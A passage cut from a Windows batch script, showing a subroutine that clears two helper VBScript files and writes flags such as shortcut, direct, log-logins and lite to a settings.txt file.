call :network.info
goto :eof
:save
del cmd\msg.vbs 2>nul
del cmd\upcheck.vbs 2>nul
if "%1"=="new" set shortcut=1&set log-logins=1&set lite=0&set direct=1
>settings.txt echo.shortcut=%shortcut%
>>settings.txt echo.direct=%direct%
>>settings.txt echo.log-logins=%log-logins%
>>settings.txt echo.lite=%lite%
goto :eof